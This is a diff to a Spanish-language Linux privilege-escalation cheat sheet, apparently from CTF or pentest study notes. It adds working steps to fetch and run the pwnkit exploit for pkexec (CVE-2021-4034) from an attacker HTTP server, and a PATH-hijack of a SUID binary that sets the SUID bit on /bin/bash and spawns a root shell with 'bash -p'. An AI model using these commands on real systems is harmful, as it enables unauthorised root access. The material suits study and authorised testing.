@@ -116,6 +116,19 @@ chmod +x exploitlxd.sh
 ./exploitlxd.sh
 ```
 <br>
+## lsb_release -a (Linux Standard Base).
+Comando utilizado para mostrar toda la información acerca de la distribución de Linux (Sistema Operativo) que se está ejecutando, como su nombre de distibución, versión, codename y descripción.
+```
+lsb_release -a
+Distributor ID: Debian
+Description:	Debian GNU/Linux 9.9 (stretch)
+Release:	9.9
+Codename:	stretch
+
+# -a -> Este parámetro es para mostrar toda la información acerca del sistema operativo.
+```
+En base a la versión del sistema operativo se pueden buscar vulnerabilidades asociadas y veríficar si se cuentan con los parches de seguridad actualizados.
+<br>
 ## su root.
 En caso de que tengas contraseñas puedes reutilizarlas con este comando y si son las correctas puedes convertirte en superusuario.
 ```
@@ -162,7 +175,7 @@ watch -c 1 /bin/bash 	# Comando para monitorizar el cambio de permisos en la bas
 <br>
 ## find \\-perm -4000 -user root -ls 2>/dev/null.
 Listar aquellos binarios SUID de los cuales el proprietario sea el usuario root y los errores los rediriges al stderr para no verlos en pantalla.<br>
-- ./usr/bin/pkexec (CVE-2021-4034).<br>Con este binario puedes llegar a escalar privilegios con la herramienta pwnkit que se encuentra en github.<br>Lo primero que se tiene que hacer es ver si la maquina víctima cuenta con wget y make. Posteriormente clonas te repositorio de github y lo descomprimes.<br>Desde tu maquina de atacante te compartes un servicio HTTP por el puerto 80 para transferir el pwnkit. Por ultimo te transfieres el pwnkit, ingresas en el, haces un make y lo ejecutas. Al ejecutarlo ganas acceso al sistema como el usuario root.
+- ./usr/bin/pkexec (CVE-2021-4034).<br>Con este binario puedes llegar a escalar privilegios con la herramienta pwnkit que se encuentra en github.<br>Lo primero que se tiene que hacer es ver si la máquina víctima cuenta con wget y make. Posteriormente te clonas repositorio de github y lo descomprimes.<br>Desde tu máquina de atacante te compartes un servicio HTTP por el puerto 80 para transferir el pwnkit. Por ultimo te transfieres el pwnkit, ingresas en el, haces un make y lo ejecutas. Al ejecutarlo ganas acceso al sistema como el usuario root.
 
 
 ```
@@ -175,16 +188,55 @@ sudo python3 -m http.server 80
 wget http://<ip-address>/pwnkit
 cd pwnkit && make && ./pwnkit
 ```
-- ./usr/local/bin/backup.<br>Ver el propietario y el grupo al cual pertenece el binario backup. En caso de que el binario pertenezca a otros grupos puedes verificar que usuario esta en ese grupo para poder ejecutar el binario.<br>
+- ./usr/local/bin/backup.<br>Ver el propietario y el grupo al cual pertenece el binario backup. En caso de que el binario pertenezca a otros grupos puedes verificar que usuario esta en ese grupo para poder ejecutar el binario.
 
 
 ```
 ls -la ./usr/local/bin/backup -> -rwsr-xr-- 1 root admin 16484 Sep  3  2017 ./usr/local/bin/backup
-# En este caso el propietario es root y el grupo al que pertenece es admin, lo siguiente es ver que usuarios estan en ese
-grupo para poderlo ejecutar.
-
+# En este caso el propietario es root y el grupo al que pertenece es admin, lo siguiente es ver que usuarios están en ese grupo para poderlo ejecutar.
+```
+```
 groups <username> # Con este comando puedes ver los grupos a los cuales pertenece un usuario.
 ```
+- ./opt/statuscheck.<br>Este es ejemplo de un binario compilado el cual el vulnerable a un <b>Path Hijacking</b>. Con el comando strings puedes listar las cadenas de carácteres imprimibles y la concatenas un less para ver la sálida del comando strings desde el inicio.
+
+
+```
+strings ./opt/statuscheck | less 
+
+/lib64/ld-linux-86-64.so.2
+lib.so.6
+system
+__cxa_finalize
+__libc_start_main
+curl -I H
+http://lH
+ocalhostH
+AWAVA
+AUATL
+```
+En este caso como se esta ejecutando por détras del binario curl de forma relativa y no absoluta. Entonces como no se toma en cuenta la ruta entera y como el binario el SUID (privilegio 4755), se puede crear un archivo llamado curl que le cambie los privilegios a las bash para ganar acceso como el usuario root.
+```
+touch curl
+chmod +x curl
+
+nano curl -> chmod u+s /bin/bash
+```
+Ahora queda modíficar el PATH para que cuando se intente ejecutar el curl, en lugar de hacerlo desde la ruta absoluta /usr/bin/curl lo haga desde la ruta actúal, tomando en cuenta el archivo que acabamos de crear con nombre curl.
+```
+export PATH=.:$PATH
+echo $PATH	# Ver el contenido de la variable PATH y asegurarse que se haya modificado.
+.:/usr/local/sbin:/usr/local/bin:/usr/sbin	# El nuevo PATH debería de inicar con un punto, que especifica la ruta actual de trabajo.
+```
+Ejecutas el binario y verificas que se le hayan cambiado los privilegios a las bash.
+```
+/opt/statuscheck
+
+ls -l /bin/bash
+-rwsr-xr-x 1 root root 1099016 May 15 2017 /bin/bash
+
+bash -p		# Ejecutar la bash como el usuario root.
+``` 
 <br>
 ## systemctl list-times.
 Ver las tareas que estan a punto de ejecutarse 
